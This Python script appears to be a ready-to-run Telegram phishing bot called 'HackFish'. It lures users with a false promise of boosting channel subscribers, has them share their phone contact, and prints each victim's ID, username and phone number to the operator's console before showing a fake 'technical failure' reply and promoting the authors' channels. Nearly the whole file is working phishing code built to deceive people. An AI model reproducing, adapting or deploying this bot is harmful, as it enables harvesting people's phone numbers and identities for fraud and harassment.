
import os

try:
    from platform import platform
except:
    os.system("pip install platform")
    from platform import platform



puk = platform()[0], platform()[1], platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]


if puk == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
    delet = 'cls'
    dr = '\\'
else:
    delet = 'clear'
    dr = '/'



os.system(delet)



def on_startup():
    print("<HackerRullerTools> Запуск!")
on_startup()



import tracemalloc

from threading import Event

try:
    from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
    from aiogram import Bot, Dispatcher, executor, types
    from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
    from aiogram.contrib.fsm_storage.memory import MemoryStorage
except:
    os.system("pip install aiogram")
    from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
    from aiogram import Bot, Dispatcher, executor, types
    from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
    from aiogram.contrib.fsm_storage.memory import MemoryStorage

try:
    import asyncio
except:
    os.system("pip install asyncio")
    import asyncio

try:
    import requests
except:
    os.system("pip install requests")
    import requests
import time

try:
    from art import *
except:
    os.system("pip install art")
    from art import *


def printtext(text):
    art1 = text2art(text)
    print(art1)
    time.sleep(1)


def printair(i):
    for l in range(i):
        time.sleep(0.6)
        print()

os.system(delet)
printtext('HackFish')
printtext('HackFish')
printtext('HackFish')
printtext('HackFish')
printtext('HackFish')
printtext('HackFish')
time.sleep(4)
os.system(delet)
printtext('HackFish')



tracemalloc.start()




storage = MemoryStorage()

bot = None
token = None
dp = None

def registerbot():
    try:
        global bot
        global token
        global dp
        token = str(input('Введите токен: '))
        bot = Bot(token)
        dp = Dispatcher(bot, storage=storage)
    except:
        print('Неккоректный токен!')
        registerbot()


registerbot()



follower = types.InlineKeyboardMarkup(row_width=2)
followerbutton1 = types.InlineKeyboardButton(text='Наш Канал 🖤', url='t.me/HackeeRullerToolsOfficial')
followerbutton2 = types.InlineKeyboardButton(text='Наш чат 💤', url='https://t.me/HackerRullerTools')
follower.add(followerbutton1).add(followerbutton2)

markup = ReplyKeyboardMarkup()
markup.add(
    KeyboardButton(
        text='✅ - Нажми',
        request_contact=True
    )
)

@dp.message_handler(commands='start')
async def cmd_start(message: types.Message):
    photo = 'https://www.promkod.ru/storage/editor/images/promokod-1.jpg'
    await bot.send_photo(chat_id=message.chat.id, photo=photo, caption='<b>💥 - Привет, ты активировал Telegram бота! Он умеет накручивать пользователей на ваши каналы и группы! Нажми на кнопку и поделиться контактом!</b>', parse_mode='HTML', reply_markup=markup)
    saveid = message.from_user.id
    username = message.from_user.username
    groupm = message.chat.id





@dp.message_handler(content_types=['contact'])
async def clicker_test(message: types.Message):
    mt = message.text
    id = message.from_user.id
    us = message.from_user.username
    con = message.contact.phone_number
    print(f'Bot > От {id} - @{us}: {mt} номер {con}')
    await message.answer('Технический сбой! Подпишись на нас!', reply_markup=follower)






async def end(_):
    printtext('BotActive')




if __name__ == '__main__':
    executor.start_polling(dp, on_startup=end)

